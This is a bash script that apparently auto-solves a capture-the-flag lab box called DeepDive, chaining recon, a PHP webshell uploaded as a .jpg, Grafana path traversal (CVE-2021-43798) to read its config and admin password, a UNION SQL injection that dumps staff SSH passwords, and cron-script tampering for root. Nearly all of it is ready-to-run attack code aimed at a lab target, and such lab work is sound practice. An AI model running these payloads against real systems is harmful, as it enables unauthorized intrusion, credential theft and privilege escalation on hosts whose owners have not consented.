#!/bin/bash
set -e

TARGET="${1:-192.168.56.101}"

UPLOAD_URL="http://${TARGET}/reviews.php"
WEBSHELL_URL="http://${TARGET}/uploads/shell.php.jpg"
GRAFANA_URL="http://${TARGET}:3000"
STAFF_URL="http://${TARGET}:8080"
LOGS="${PROJECT_ROOT:-$HOME/DeepDive}/logs"
mkdir -p "$LOGS"

echo "[*] ========================================="
echo "[*] DeepDive Auto-Solve Script"
echo "[*] Target: $TARGET"
echo "[*] ========================================="


# helper: run a command on the target via the webshell (POST, handles special chars)
wcmd() { curl -s -X POST "$WEBSHELL_URL" --data-urlencode "c=$1"; }
# ===== Phase 1: Reconnaissance =====
echo "[*] Phase 1: Reconnaissance"
nmap -sV -sC -Pn -oN "$LOGS/autoscan.txt" "$TARGET" > /dev/null 2>&1
echo "[+] Nmap complete => $LOGS/autoscan.txt"

# ===== Phase 2: Enumeration =====
echo "[*] Phase 2: Enumeration"
gobuster dir -u http://${TARGET}/ -w /usr/share/dirb/wordlists/common.txt -q -o "$LOGS/gobuster.txt" 2>/dev/null
grep -q "uploads" "$LOGS/gobuster.txt" || { echo "[-] /uploads not found"; exit 1; }
echo "[+] /uploads discovered via gobuster => $LOGS/gobuster.txt"

# ===== Phase 3: Exploitation =====
echo "[*] Phase 3: Exploitation"
echo '<?php system($_POST["c"]); ?>' > /tmp/shell.php.jpg
curl -s -X POST "$UPLOAD_URL" -F "photo=@/tmp/shell.php.jpg" > "$LOGS/upload_response.txt"
echo "[+] Webshell uploaded => $LOGS/upload_response.txt"

# Verify
WHOAMI=$(wcmd "whoami")
echo "[+] RCE confirmed: $WHOAMI"

# ===== Phase 4: Post-Exploitation Enumeration =====
echo "[*] Phase 4: Post-Exploitation Enumeration"
INTERNAL=$(wcmd "ss -tlnp 2>/dev/null")
echo "[+] Internal services discovered:"
echo "$INTERNAL" > "$LOGS/internal_services.txt"
echo "$INTERNAL" | grep -E "3000|3306"
echo "[+] Grafana on localhost:3000, MySQL on localhost:3306"

# ===== Phase 5: Grafana Exploitation (CVE-2021-43798) =====
echo "[*] Phase 5: Grafana Exploitation"
GRAFANA_INI=$(wcmd "curl -s --path-as-is 'http://127.0.0.1:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini'")
echo "[+] grafana.ini read via CVE-2021-43798"
echo "$GRAFANA_INI" > "$LOGS/grafana.ini"

ADMIN_PASS=$(echo "$GRAFANA_INI" | grep 'admin_password' | cut -d'=' -f2 | tr -d ' ')
echo "[+] Staff portal credentials extracted: admin / $ADMIN_PASS"

# ===== Pase 6: Post-Exploitation" ======
echo "[*] Phase 6: Post-Exploitation"
echo "[*] Logging into staff portal on port 8080..."
curl -s -c "$LOGS/cookies.txt" \
    -d "username=admin&password=$ADMIN_PASS" \
    -L "$STAFF_URL/login.php" > /dev/null
echo "[+] Logged in as admin"

echo "[*] Running UNION injection on search.php..."
SQLI_RESP=$(curl -s -b "$LOGS/cookies.txt" \
    --data-urlencode "diver_name=' UNION SELECT id,username,password,role,ssh_password FROM staff-- -" \
    "$STAFF_URL/search.php")
echo "$SQLI_RESP" > "$LOGS/sqli_response.txt"

DIVEMASTER_PASS=$(echo "$SQLI_RESP" | grep -oP 'D1veM@ster[^<]+' | head -1)
echo "[+] Credentials extracted: divemaster / $DIVEMASTER_PASS"

# ===== Phase 7: SSH + User Flag =====
echo "[*] Phase 7: SSH as divemaster"
ssh-keygen -f "$HOME/.ssh/known_hosts" -R "$TARGET" > /dev/null 2>&1 || true
sshpass -p "$DIVEMASTER_PASS" ssh -o StrictHostKeyChecking=no divemaster@$TARGET \
    "cat ~/user.txt"
echo "[+] User flag captured!"

# ===== Phase 8: Privilege Escalation =====
echo "[*] Phase 8: Privilege Escalation"
sshpass -p "$DIVEMASTER_PASS" ssh -o StrictHostKeyChecking=no divemaster@$TARGET \
    "python3 -c \"
import re
f=open('/opt/sync_logs.py','r+')
c=f.read().replace('OUTPUT_REPORT = 0','OUTPUT_REPORT = 1')
f.seek(0); f.write(c); f.truncate()
f.close()
\""
echo "[+] OUTPUT_REPORT flipped to 1 in /opt/sync_logs.py"

# ===== Phase 9: Root Flag =====
echo "[*] Phase 9: Waiting for cron (up to 5 minutes)"
ROOT_FLAG=""
ELAPSED=0
while [ $ELAPSED -lt 310 ]; do
    SYNC_LOG=$(sshpass -p "$DIVEMASTER_PASS" ssh \
        -o StrictHostKeyChecking=no -o LogLevel=ERROR \
        divemaster@$TARGET \
        "cat /var/log/bluewater/sync.log 2>/dev/null" 2>/dev/null)
    ROOT_FLAG=$(echo "$SYNC_LOG" | grep -oP '(FF|FLAG)\{[^}]+\}' | tail -1)
    [ -n "$ROOT_FLAG" ] && break
    echo "[*] Waiting... (${ELAPSED}s elapsed)"
    sleep 15
    ELAPSED=$((ELAPSED + 15))
done
echo "$SYNC_LOG" > "$LOGS/sync.log"
echo "[+] Root flag: $ROOT_FLAG"

echo "[+] ========================================="
echo "[+] DEEPDIVE fully compromized!"
echo "[+] ========================================="
